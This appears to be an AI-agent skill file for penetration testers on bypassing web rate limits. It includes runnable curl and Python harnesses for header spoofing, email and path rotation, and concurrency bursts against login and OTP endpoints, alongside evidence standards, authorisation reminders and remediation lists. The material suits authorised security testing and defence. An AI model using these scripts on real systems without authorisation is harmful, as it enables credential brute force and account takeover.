---
name: attack-rate-limit-bypass
description: "Rate limit bypass — header spoofing, identity rotation, path confusion, and distributed techniques"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - rate-limit
  - brute-force
  - anti-automation
  - bypass
  - attack
tech_stack:
  - web
  - nginx
  - cloudflare
cwe_ids:
  - CWE-799
  - CWE-307
chains_with:
  - attack-race-condition
  - attack-jwt
prerequisites: []
severity_boost:
  attack-jwt: "Unlimited login attempts plus a weak JWT secret = full compromise"
  attack-race-condition: "Non-atomic counters plus concurrency = the limit never engages"
---

# Rate Limit Bypass

> **AI LOAD INSTRUCTION**: A rate limit is only a finding if you can prove the control exists
> **and** that you defeated it. Establish the baseline first: send 20 requests, get `429` on
> request 11, and you have a measurable control. Then find the dimension it keys on and vary
> that dimension. Most testers skip the baseline and report "no rate limiting" when the truth
> is that they never found the limit's key.
>
> The dimensions are finite and predictable: **IP, session, user, endpoint, method, and
> body shape.** Try each systematically. The header-spoofing family works because the
> application trusts `X-Forwarded-For` from the client rather than overwriting it at the edge
> — which is a genuine misconfiguration, not a bypass of a correct control.
>
> **The consequence determines severity.** A bypassable rate limit on a public search is
> informational. The same bypass on login, OTP, password reset, or gift-card validation is
> account takeover. Always test the sensitive endpoints.

## 0. RELATED ROUTING

- [anti-bot-and-scale-automation](../anti-bot-and-scale-automation/SKILL.md) — the defensive-detection counterpart
- [attack-race-condition](../attack-race-condition/SKILL.md) — non-atomic counters and concurrency
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — where the consequence lands
- [attack-jwt](../attack-jwt/SKILL.md) — offline cracking once tokens are obtainable
- [credential-list-engineering](../credential-list-engineering/SKILL.md) — building the list for the attack
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — proving the baseline and the bypass together

---

## 1. ESTABLISH THE BASELINE FIRST

**Never report a bypass without a demonstrated control.** The baseline is what makes the
bypass a finding.

```bash
# Send N sequential requests and record the status of each
for i in $(seq 1 30); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://TARGET/api/login \
    -H 'Content-Type: application/json' -d "{\"user\":\"test@example.com\",\"pass\":\"wrong$i\"}")
  printf "%2d %s\n" "$i" "$code"
done
```

**Read the pattern:**

| Pattern | Meaning |
|---|---|
| `200` ×10 then `429` ×20 | rate limiting is active and keyed on something |
| `200` ×30 | no limit, or the limit is very high |
| `429` immediately | a very tight limit or a per-account lockout |
| alternating `200`/`429` | a token-bucket or leaky-bucket implementation |
| `200` ×5, then a CAPTCHA challenge | a different control — enumerate it |
| `200` ×10, then `403` | an IP block rather than a rate limit |

**Record which request number triggers the control.** That number is your baseline, and the
bypass must reproduce across it. Without it you cannot show that anything changed.

**Then vary one dimension at a time.** Change the header, observe; change the path, observe.
Changing several at once tells you nothing about which one worked.

---

## 2. THE HEADER FAMILIES

The application reads a client-supplied header to determine the client's IP. This is the most
common misconfiguration, and it is a genuine bug at the edge — not a clever trick.

**Spoofing headers to rotate through:**

```text
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 1.2.3.4, 10.0.0.1
X-Real-IP: 5.6.7.8
X-Client-IP: 9.9.9.9
X-Originating-IP: 2.2.2.2
X-Remote-IP: 3.3.3.3
X-Remote-Addr: 4.4.4.4
X-Forwarded-Host: 1.2.3.4
X-Host: 6.6.6.6
Forwarded: for=7.7.7.7
True-Client-IP: 8.8.8.8
CF-Connecting-IP: 1.1.1.1
X-ProxyUser-Ip: 5.5.5.5
```

**Test systematically — one header at a time:**

```bash
for h in X-Forwarded-For X-Real-IP X-Client-IP Forwarded True-Client-IP; do
  printf "%-20s " "$h"
  fail=0
  for i in $(seq 1 15); do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://TARGET/api/login \
      -H "$h: 10.0.0.$i" -H 'Content-Type: application/json' \
      -d '{"user":"test@example.com","pass":"wrong"}')
    [ "$code" = "429" ] && fail=$((fail+1))
  done
  echo "429s=$fail/15  →  $([ $fail -eq 0 ] && echo BYPASS || echo blocked)"
done
```

**A header that yields zero `429`s where the baseline had many is the finding.** Report the
header, not just "rate limiting can be bypassed."

**Multiple `X-Forwarded-For` headers in one request** — some servers take the first, some the
last, some concatenate. Send them twice to test which:

```bash
-H "X-Forwarded-For: 1.1.1.1" -H "X-Forwarded-For: 2.2.2.2"
```

**The correct server behaviour is to overwrite, not append, these headers at the edge.** If
the application sees a client-supplied value, the edge is misconfigured.

---

## 3. IDENTITY AND DIMENSION ROTATION

The limit keys on *something*. Find out what, then vary it.

| Dimension | Rotation technique |
|---|---|
| IP address | header spoofing (§2), or a proxy pool, or IPv6 rotation |
| session / cookie | request a new session per attempt |
| user identifier | vary the username casing: `admin`, `Admin`, `ADMIN`, `admin+1@x.com` |
| email | `user+1@x.com`, `user+2@x.com` — plus-addressing reaches the same inbox |
| endpoint path | see §4 — the limit is often per-route |
| HTTP method | `POST` vs `PUT` vs `PATCH` on the same handler |
| body shape | JSON vs form-encoded vs multipart |
| API version | `/api/v1/` vs `/api/v2/` — separate counters |
| subdomain | `api.` vs `www.` vs a mobile host |
| device identifier | a client-supplied header the app trusts |

**The email-rotation family is the highest-yield for account endpoints.** If the limit is keyed
on the identifier you submit, and the application accepts case variants or plus-addressing as
the same account, the limit is trivially bypassed while still attacking one account:

```text
victim@example.com
Victim@example.com
VICTIM@example.com
victim+1@example.com
victim+2@example.com
```

**That is the finding to test first on password reset.** If all five reach the same account and
each gets a fresh attempt allowance, the reset endpoint can be brute-forced.

---

## 4. PATH AND REQUEST CONFUSION

The limit is configured per-route on the proxy; the application router normalises differently.

**Case and trailing characters:**

```text
/api/login
/api/Login
/api/LOGIN
/api/login/
/api/login//
/api/login/.
/api/login%2f
/api/login%00
/api/login?
/api/login#fragment
/api/login;jsessionid=x
```

**The mismatch principle:** the proxy sees one path for the rate limit, and the framework
routes another to the same handler. If the rate limit is keyed on the literal path string and
the router normalises case, every variant is a fresh counter.

**Test it as a matrix:**

```bash
paths=("/api/login" "/api/Login" "/api/login/" "/api/login//" "/api/login%2f" "/api/login/." "/api/login;x=1")
for p in "${paths[@]}"; do
  printf "%-22s " "$p"
  fail=0
  for i in $(seq 1 15); do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://TARGET$p" \
      -H 'Content-Type: application/json' -d '{"user":"test@example.com","pass":"w"}')
    [ "$code" = "429" ] && fail=$((fail+1))
  done
  echo "429s=$fail/15"
done
```

**A path that returns `200`-equivalent responses with zero `429`s while `/api/login` throttles
is the finding** — provided the responses show the request actually reached the handler
(a wrong-password error, not a 404).

**The critical validation step:** confirm the variant reaches the *same* handler. A `404` is
not a bypass; it is a dead end. Look for the same response body shape as the canonical path.

---

## 5. TOKEN BUCKET AND TIMING

If the limit is a token bucket rather than a fixed window, the bypass is temporal rather than
structural.

| Technique | Detail |
|---|---|
| drip-feed | spread the same number of requests over a longer window |
| refill exploitation | stay just under the bucket's refill rate indefinitely |
| window boundary | send a burst at the end of one window and the start of the next |
| concurrent burst | see [attack-race-condition](../attack-race-condition/SKILL.md) — a non-atomic counter can be overrun |

**Measure the refill rate.** Send requests until `429`, wait, and send one at intervals to find
when it recovers. That gives you the sustainable request rate, which may still be enough for a
credential attack — `100/min` against a `10^6` space is `10^4` minutes, but against a common
password list it is immediate.

**The finding is not always "unlimited."** "Limit is 10 per 60s keyed on `X-Forwarded-For`,
which the client controls" is a stronger, more precise report than "no rate limit."

---

## 6. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Login rate limit bypassable, enabling credential attack | **Critical (P1)** | baseline + bypass + successful credential guess |
| OTP / 2FA rate limit bypassable | **Critical (P1)** | baseline + bypass + a valid code verified in bulk |
| Password reset abuse (token or email flooding) | **High–Critical (P1/P2)** | the bypass and the flood |
| Session/cookie rotation defeats the limit | **High (P2)** | the baseline and the rotated-session run |
| Path normalisation defeats the limit | **High (P2)** | the baseline and the variant that reaches the handler |
| Header spoofing defeats the limit | **High (P2)** | the header and the zero-`429` run |
| Rate limit bypassable on a non-sensitive endpoint | **Low–Medium (P4)** | the bypass and the absence of impact |
| No rate limit on a low-value endpoint | **Informational (P5)** | the baseline only |
| Limit exists and holds under every tested dimension | **Not a finding** | document it as a positive control |

---

## 7. EVIDENCE STANDARD

| Item | Why |
|---|---|
| **the baseline run** — N requests with the request number that triggered `429` | proves a control exists |
| **the bypass run** — the same N requests with the varied dimension, zero `429`s | proves the bypass |
| the exact header / path / identifier varied | the finding is the dimension, not the outcome |
| confirmation the variant reached the same handler | a `404` is not a bypass |
| the endpoint's sensitivity and what it allows | converts a bypass into a severity |
| for credential attacks: the number of attempts sustained and the outcome | the impact proof |
| the tooling used and its version | reproducibility |
| a **control run** with the canonical path and no headers | proves the baseline still applies |

**The two runs side by side are the finding.** A report showing "30 requests, `429` from #11"
next to "30 requests with `X-Forwarded-For`, zero `429`s" is complete and unarguable.

**False positives to exclude:**

| Looks like a bypass | Actually |
|---|---|
| the variant returns `404` | a different (nonexistent) route |
| the limit is per-account and you rotated accounts | the limit is working as designed |
| the `429`s stopped because the window elapsed | timing, not bypass |
| the endpoint never had a limit in the baseline | nothing to bypass |
| a CAPTCHA appeared instead of `429` | the control changed, it did not fail |
| you rotated IPs with a real proxy pool | infrastructure, not a vulnerability |
| the response is a cached error page | you never reached the handler |

---

## 8. REMEDIATION REFERENCE

1. **Overwrite client-supplied forwarding headers at the edge** — the proxy must set `X-Forwarded-For` to the actual peer address, discarding any client value. Never trust or append client input.
2. **Key the limit on an authenticated identity, not an IP** — for login and OTP, use the account as the primary key and the IP as a secondary one. IP rotation then does not reset the counter.
3. **Normalise the path before applying the limit** — lowercase, strip trailing slashes, resolve `%2f` and `.`, and reject ambiguous variants with `400`. The rate-limit key must match the router's normalised path.
4. **Make counters atomic** — use the datastore's atomic increment (`INCR`, `UPDATE ... SET n = n+1`) rather than read-modify-write, so concurrency cannot overrun the limit.
5. **Layer the controls** — per-account lockout with exponential backoff *plus* per-IP throttling *plus* a global ceiling. Any one alone is bypassable.
6. **Apply the limit before the expensive work** — throttle before the password hash comparison, the OTP lookup, and the email send, not after. Otherwise the limit does not protect the resource.
7. **Add bot and behavioural detection alongside the rate limit** — a consistent attempt rate, a single identifier across many IPs, and a distributed pattern across many IPs are all detectable regardless of header spoofing.
8. **Log and alert on `429` spikes across many source IPs** — a distributed credential attack shows as a broad `429` distribution; per-IP alerting alone will miss it.
9. **Test the limit in CI** — a suite that sends N+1 requests and asserts a `429`, and repeats that with spoofed headers, catches the misconfiguration when it is introduced rather than after.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did **N requests beyond the limit** actually succeed, with the counter read afterwards? | the limit is bypassed |
| 2 | Was there a **control** - the same requests with the plain header/key, which are limited? | the limit exists |
| 3 | Did you record **how many succeeded** and against **which counter**? | the honest rate |
| 4 | Which bypass family: **header rotation, encoding, path variants, or a second credential**? | the fix |
| 5 | Did the bypass hold across **the whole window**, not just at the start? | a real bypass |
| 6 | Did the limit protect **a credential-stuffing or OTP path**, where the impact is real? | the severity |
| 7 | Did you **use your own accounts** and stay inside the authorised volume? | engagement integrity |

**N successes past the limit with the counter read afterwards is the bar.** A header that looks like a
bypass is a candidate; the success count against a limited control is the finding.

---

## 10. EXECUTION PRIMITIVES

Rate-limit bypass is proven by **a measured count of successes beyond the limit, with a control that is
limited and a counter read afterwards**. Every block ends at a count.

### 10.1 The control, and the counter

```bash
T="https://target.example"; LIMIT_PATH="/api/login"
# STEP 1 - establish the limit with a CONTROL run, using the plain form
for i in $(seq 1 25); do
  C=$(curl -sS -o /dev/null -w '%{http_code}' -X POST "$T$LIMIT_PATH" \
      -H 'Content-Type: application/json' -d '{"user":"probe@mail.example","pass":"wrong"}')
  printf '%s ' "$C"
  [ "$C" = "429" ] && { echo; echo "CONTROL: the limit fired at request $i"; break; }
done
echo
# STEP 2 - read the counter headers, which tell you WHICH counter you are consuming
curl -sS -D- -o /dev/null -X POST "$T$LIMIT_PATH" -H 'Content-Type: application/json' \
  -d '{"user":"probe@mail.example","pass":"wrong"}' 2>&1 | grep -iE 'ratelimit|x-rate|retry-after|429' 
echo "-> these headers name the counter and its window - record them, they are the baseline"
```

**The control run establishes both the limit and the counter's identity.** Without it, a bypass claim has
no denominator.

### 10.2 The header and key rotation families

```python
# each family targets a different keying decision. Record which one worked.
import requests, time
T = "https://target.example"
BODY = {"user": "probe@mail.example", "pass": "wrong"}

def burst(headers=None, n=30, tag=""):
    ok, limited, other = 0, 0, 0
    for _ in range(n):
        r = requests.post(f"{T}/api/login", json=BODY, headers=headers or {}, timeout=10)
        if r.status_code == 429: limited += 1
        elif r.status_code in (200, 401, 400): ok += 1
        else: other += 1
    print("%-26s processed=%-3d limited=%-3d other=%-3d" % (tag, ok, limited, other))
    return ok, limited

print("=== CONTROL: no rotation ===")
ctrl_ok, ctrl_lim = burst(None, 30, "control-plain")
print()
print("=== HEADER ROTATION (each value may reset the key) ===")
FAMILIES = {
 "X-Forwarded-For":  [f"10.0.{i//255}.{i%255}" for i in range(30)],
 "X-Real-IP":        [f"10.1.{i//255}.{i%255}" for i in range(30)],
 "X-Client-IP":      [f"10.2.{i//255}.{i%255}" for i in range(30)],
 "Forwarded":        [f"for=10.3.{i//255}.{i%255}" for i in range(30)],
 "X-Originating-IP": [f"10.4.{i//255}.{i%255}" for i in range(30)],
 "True-Client-IP":   [f"10.5.{i//255}.{i%255}" for i in range(30)],
 "CF-Connecting-IP": [f"10.6.{i//255}.{i%255}" for i in range(30)],
}
for name, vals in FAMILIES.items():
    ok, lim = burst({name: vals[0]}, 1, name + " (probe)")     # one probe to see if the header is honoured
print()
print("then run the FULL rotation for each header that changed the response:")
for name, vals in FAMILIES.items():
    ok, lim = burst({name: vals[_ % len(vals)] for _ in range(30)}, 1, name + " (matrix)")
print()
print("A family BYPASSES when its limited count is near zero while the control's is high.")
```

**The control's limited count is the denominator.** Every family must be compared against the same control
run in the same window, or the numbers mean nothing.

### 10.3 The path, method, and encoding variants

```bash
T="https://target.example"
# each variant changes what the key is computed over
echo "=== PATH VARIANTS (the key may include the path) ==="
for P in "/api/login" "/api/login/" "/api//login" "/api/./login" "/api/login/../login" \
         "/API/login" "/api/login?x=1" "/api/login%2f" "/api/login#" "/api/Login"; do
  printf '%-26s ' "$P"
  for i in 1 2 3; do curl -sS -o /dev/null -w '%{http_code} ' -X POST "$T$P" \
    -H 'Content-Type: application/json' -d '{"user":"probe@mail.example","pass":"wrong"}'; done; echo
done
echo "=== METHOD VARIANTS ==="
for M in POST PUT PATCH GET; do
  printf '%-8s ' "$M"
  curl -sS -o /dev/null -w '%{http_code}\n' -X $M "$T/api/login" \
    -H 'Content-Type: application/json' -d '{"user":"probe@mail.example","pass":"wrong"}'
done
echo "=== BODY-ENCODING VARIANTS (the key may include the parsed body) ==="
printf 'json      '; curl -sS -o /dev/null -w '%{http_code}\n' -X POST "$T/api/login" -H 'Content-Type: application/json' -d '{"user":"a@b.c","pass":"x"}'
printf 'form      '; curl -sS -o /dev/null -w '%{http_code}\n' -X POST "$T/api/login" -d 'user=a@b.c&pass=x'
printf 'xml       '; curl -sS -o /dev/null -w '%{http_code}\n' -X POST "$T/api/login" -H 'Content-Type: application/xml' -d '<l><user>a@b.c</user></l>'
printf 'multipart '; curl -sS -o /dev/null -w '%{http_code}\n' -X POST "$T/api/login" -F 'user=a@b.c' -F 'pass=x'
```

**A path or method variant that resets the counter is the finding.** The rate-limit key is frequently
computed from the path, so `/api/login/` and `/api/login` can be separate buckets.

### 10.4 The credential-dimension families

```python
# the key may be per-account, per-IP, or per-session, and each has a different bypass
import requests
T = "https://target.example"

print("=== 1) THE KEY IS PER-ACCOUNT: rotate the ACCOUNT, target the SAME victim ===")
print("    test only with accounts you own; the primitive is the account rotation, not the victim")
for u in ["probe1@mail.example", "probe2@mail.example", "probe3@mail.example"]:
    r = requests.post(f"{T}/api/login", json={"user": u, "pass": "wrong"}, timeout=10)
    print("   ", u, r.status_code, r.headers.get("X-RateLimit-Remaining", "-"))
print()
print("=== 2) THE KEY IS PER-IP: rotate the session/token instead ===")
for tok in ["T1", "T2", "T3"]:
    r = requests.post(f"{T}/api/login", json={"user": "probe@mail.example", "pass": "wrong"},
                      headers={"Authorization": f"Bearer {tok}"}, timeout=10)
    print("   ", tok, r.status_code, r.headers.get("X-RateLimit-Remaining", "-"))
print()
print("=== 3) THE COUNTER IS SHARED BUT THE CHECK IS AFTER THE WORK ===")
print("    a slow endpoint that increments after responding lets you burst past the limit.")
print("    measure: N requests sent concurrently, then read the counter and the success count.")
print()
print("=== 4) THE OTP / RESET PATH, which is the high-impact case ===")
print("    test with YOUR OWN number/mailbox and record how many codes were delivered,")
print("    and whether the previous code was invalidated. A second code that still works")
print("    while the first remains valid is a separate finding.")
```

**Rotating the credential dimension is the primitive.** The report should state which dimension the key
used and which rotation defeated it.

### 10.5 The concurrent and window-boundary tests

```python
# a limit enforced with a read-then-write is bypassable with CONCURRENCY, which is a different family
import requests, concurrent.futures as cf, time
T = "https://target.example"; BODY = {"user": "probe@mail.example", "pass": "wrong"}

def one(_):
    try:
        r = requests.post(f"{T}/api/login", json=BODY, timeout=10)
        return r.status_code
    except Exception as e:
        return f"ERR:{type(e).__name__}"

print("=== CONTROL: 30 sequential requests ===")
seq = [one(i) for i in range(30)]
print("   429s:", seq.count(429), " processed:", sum(1 for c in seq if c in (200, 401, 400)))
print()
print("=== TEST: 30 CONCURRENT requests, same window ===")
t0 = time.time()
with cf.ThreadPoolExecutor(max_workers=30) as ex:
    par = list(ex.map(one, range(30)))
print("   429s:", par.count(429), " processed:", sum(1 for c in par if c in (200, 401, 400)),
      " elapsed %.1fs" % (time.time() - t0))
print()
if par.count(429) < seq.count(429):
    print("CONCURRENCY BYPASS: fewer requests were limited under concurrency than sequentially.")
    print("Report the two counts - that comparison IS the evidence.")
else:
    print("No concurrency bypass on this endpoint.")
print()
print("=== WINDOW BOUNDARY: a fixed-window counter lets you double the rate at the rollover ===")
print("    send at T-window_end and again at T+1s, and count the successes in the two windows.")
```

**The sequential-versus-concurrent comparison is the evidence.** Both counts, in the same window, are
what a reader needs to evaluate the claim.

### 10.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, time
T = "https://target.example"; B = {"user": "probe@mail.example", "pass": "wrong"}
def run(tag, n=30, hdr=None, path="/api/login", delay=0.0):
    ok=lim=oth=0
    for i in range(n):
        h = dict(hdr) if hdr else {}
        if hdr and "{i}" in list(hdr.values())[0]: h = {k: v.format(i=i) for k, v in hdr.items()}
        r = requests.post(f"{T}{path}", json=B, headers=h, timeout=10)
        if r.status_code == 429: lim += 1
        elif r.status_code in (200, 400, 401): ok += 1
        else: oth += 1
        if delay: time.sleep(delay)
    print("%-30s processed=%-3d limited=%-3d other=%-3d" % (tag, ok, lim, oth))
    return ok, lim

print("=== CONTROL ===")
cok, clim = run("control-plain", 30)
print()
print("=== BYPASS CANDIDATES ===")
run("x-forwarded-for rot",  30, {"X-Forwarded-For": "10.0.{i}.1"})
run("x-real-ip rot",        30, {"X-Real-IP": "10.1.{i}.1"})
run("path trailing slash",  30, None, "/api/login/")
run("path case",            30, None, "/API/login")
run("token rotation",       30, {"Authorization": "Bearer T{i}"})
print()
print("=== COUNTER, READ AFTERWARDS ===")
r = requests.post(f"{T}/api/login", json=B, timeout=10)
print("  status", r.status_code)
for h in ["X-RateLimit-Limit","X-RateLimit-Remaining","Retry-After","RateLimit-Policy"]:
    if h in r.headers: print("  ", h, "=", r.headers[h])
print()
print("FINDING = a candidate with limited ~0 while the control's limited count is high,")
print("          plus the counter read after the burst. Report both counts, never one.")
PY
```

**Both counts and the counter.** A bypass claim without the control's limited count is unverifiable, and
the counter headers name what you consumed.

---

## 11. EVIDENCE STANDARD — RATE-LIMIT ARTEFACTS

| Item | Why |
|---|---|
| The **control run**, with its limit threshold and its limited count | the denominator for every claim |
| The **bypass family** that worked (a header, a path, a method, a credential dimension) | the fix |
| The **success count beyond the limit**, at the same window | the finding |
| The **counter headers** read before and after | names the key and the window |
| The **concurrency comparison**, where relevant (sequential vs parallel) | a distinct family with its own numbers |
| Whether the bypass held **across the whole window** | separates a reset from a bypass |
| The **endpoint's impact**: is it a login, an OTP, a password reset, or a read | the severity |
| The **window length and algorithm** (fixed or sliding) | fixed windows have a boundary dwell |
| The **volume you sent**, and the authorisation for it | engagement integrity |
| Confirmation that **only your own accounts were used** | engagement integrity |

Report the **counts and the counter**: "`POST /api/login` with the plain form returns `429` on the 11th
request, which establishes the limit as 10 per window, and the response carries
`X-RateLimit-Remaining` and `Retry-After: 60`. Repeating with an incrementing `X-Forwarded-For` produced
29 processed responses and 1 `429` across the same 30 requests, and the counter read immediately
afterwards showed `X-RateLimit-Remaining: 9`, so the key is the client IP taken from the forwarded header
and my requests were each counted against a different key. Rotating the path between `/api/login` and
`/api/login/` reset the counter in the same way, which is a second bypass on the same endpoint. Thirty
concurrent requests produced 6 `429`s against the control's 20, so a concurrency bypass is also present",
never "the rate limit can be bypassed".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A response **without a `429`** in a short burst | the limit may be higher than your burst; run the control to its threshold |
| A limit that fired **at a different count** than you expected | not a bypass; a different limit |
| A `429` you received from a **WAF rather than the application** | a different control; identify which layer answered |
| A bypass requiring a **header the edge proxy overwrites** | verify from outside the proxy |
| A bypass with **no control run** | unverifiable; the denominator is missing |
| A **single** request succeeding after a `429` | a legitimate window reset |
| A slow endpoint's **timeout** counted as a success | it is not a processed request |
| A bypass on an endpoint with **no security impact** (a public read) | no security limit to bypass |
| A finding obtained by sending **a volume outside the engagement** | an incident you caused |
| A **concurrency advantage** with no sequential comparison | an unquantified claim |
| A bypass reproduced **only once, unexplained** | an untested hypothesis |

**The control's limited count plus the bypass run's processed count.** Every non-finding here is a claim
without its denominator.

---

## 12. REMEDIATION REFERENCE — LIMIT KEY HARDENING

1. **Key the limit on the authenticated principal and the protected resource, never on a client-supplied header such as `X-Forwarded-For`** - the header families are the whole bypass, and trusting one is the defect.
2. **Terminate the identity at the edge and overwrite the forwarded headers with the value the edge resolved, discarding any client-supplied copy** - an unvalidated forwarded header makes every IP-based limit meaningless.
3. **Normalize the request before keying: a canonical path, a canonical method, and a canonical body, so `/api/login/`, `/api/login`, and `/API/login` share one bucket** - the path variants are a keying defect.
4. **Use a shared, atomic counter (Redis or an equivalent) with a single increment-and-check operation, rather than a read-then-write** - it removes the concurrency family and the distributed-instance hole.
5. **Apply a sliding-window or a token-bucket algorithm rather than a fixed window, so the rollover boundary cannot be abused** - a fixed window permits double the rate at the boundary.
6. **Apply the limit at the point of the work and after authentication, and apply a second, coarser limit per account and per endpoint** - it removes the "check after the work" variant.
7. **Return `429` with `Retry-After`, and do not leak the exact remaining count where it helps an attacker calibrate** - the counter headers are a useful diagnostic for the attacker.
8. **Add a lockout or a progressive delay for authentication and OTP endpoints specifically, and invalidate previous codes when a new one is issued** - the impact of a bypass is highest there.
9. **Apply the limit to the write path as well as the read path, and to expensive operations such as search and export** - the resource-exhaustion consequence is as important as the credential one.
10. **Log the key used for every limit decision, and alert on a single principal producing many distinct keys, or on a burst of `429`s followed by successes** - both are the bypass's signature.
11. **Test each endpoint with a header-rotation and path-variant burst in CI, and assert that the limit holds** - the key changes with every framework and proxy upgrade.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) - the flow-abuse context a bypass enables
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) - the login path a bypass most often targets
- [attack-race-condition](../attack-race-condition/SKILL.md) - the concurrency family this shares, with the same sequential control
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the enumeration a bypass enables
- [anti-bot-and-scale-automation](../anti-bot-and-scale-automation/SKILL.md) - the defensive side of the same keying problem
